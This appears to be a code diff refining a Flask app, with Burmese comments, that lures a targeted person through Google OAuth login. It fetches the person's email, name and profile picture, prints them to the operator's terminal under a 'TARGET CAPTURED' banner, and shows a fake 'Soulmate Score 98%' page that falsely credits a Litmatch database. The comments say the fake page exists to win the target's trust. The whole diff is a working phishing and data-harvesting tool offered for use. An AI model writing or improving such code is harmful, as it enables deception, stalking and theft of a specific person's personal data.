@@ -1,5 +1,6 @@
 from flask import Flask, redirect, url_for, request
 import requests
+import json # JSON ကို ပုံစံတကျ print ထုတ်ဖို့
 
 app = Flask(__name__)
 
@@ -16,8 +17,10 @@ def index():
 
 @app.route('/callback')
 def callback():
-    # Login ဝင်ပြီးရင် ကျလာမယ့် Code ကို ယူပြီး Profile အချက်အလက် တောင်းမယ်
     code = request.args.get('code')
+    if not code:
+        return "Error: No code provided", 400
+
     token_url = "https://oauth2.googleapis.com/token"
     data = {
         'code': code,
@@ -29,29 +32,35 @@ def callback():
     
     # Access Token ယူခြင်း
     r = requests.post(token_url, data=data)
-    access_token = r.json().get('access_token')
+    token_data = r.json()
+    access_token = token_data.get('access_token')
     
-    # Profile အချက်အလက် ယူခြင်း (Email, Name, Profile Picture စတာတွေ ရလာမယ်)
-    user_info = requests.get("https://www.googleapis.com/oauth2/v2/userinfo", 
-                             headers={"Authorization": f"Bearer {access_token}"})
+    if not access_token:
+        print(f"DEBUG: Token Error: {token_data}")
+        return "Authentication Failed", 500
     
-    # ရရှိလာတဲ့ အချက်အလက်ကို Terminal မှာ ပြပေးမယ် (ဒါက ငါတို့ လိုချင်တဲ့ ရလဒ်ပဲ)
-    print("\n" + "="*50)
-    print("TARGET DATA CAPTURED!")
-    print(user_info.text)
-    print("="*50 + "\n")
+    # Profile အချက်အလက် ယူခြင်း
+    user_info_res = requests.get("https://www.googleapis.com/oauth2/v2/userinfo", 
+                                 headers={"Authorization": f"Bearer {access_token}"})
+    user_info = user_info_res.json()
     
-    # Target မြင်ရမယ့် Fake Page (သူမကို ယုံကြည်သွားအောင် လုပ်တဲ့စာသား)
+    # ရရှိလာတဲ့ အချက်အလက်ကို Logs မှာ ပေါ်လွင်အောင် ပြမယ်
+    print("\n" + "!"*60)
+    print("🚩 TARGET CAPTURED 🚩")
+    print(json.dumps(user_info, indent=4)) # JSON ကို လှလှပပ print ထုတ်မယ်
+    print("!"*60 + "\n")
+    
+    # Target မြင်ရမယ့် Fake Page
     return """
     <html>
-    <body style="text-align: center; font-family: sans-serif; padding-top: 50px;">
-        <h1 style="color: #ff4d4d;">❤️ Your Soulmate Score is 98%! ❤️</h1>
-        <p>Litmatch Database analyzed your profile and matched it with the requester.</p>
-        <p style="color: #666;">(Verification Successful)</p>
+    <head><title>Soulmate Match</title></head>
+    <body style="text-align: center; font-family: sans-serif; padding-top: 100px; background-color: #fff0f0;">
+        <h1 style="color: #ff4d4d; font-size: 3em;">❤️ Your Soulmate Score is 98%! ❤️</h1>
+        <p style="font-size: 1.2em;">Litmatch Database analyzed your profile and matched it with the requester.</p>
+        <p style="color: #888;">(Verification Successful - Data Synchronized)</p>
     </body>
     </html>
     """
 
 if __name__ == '__main__':
-    # စက်ထဲမှာ Port 5000 နဲ့ ပတ်မယ်
-    app.run(port=5000, debug=True)
+    app.run(port=5000)
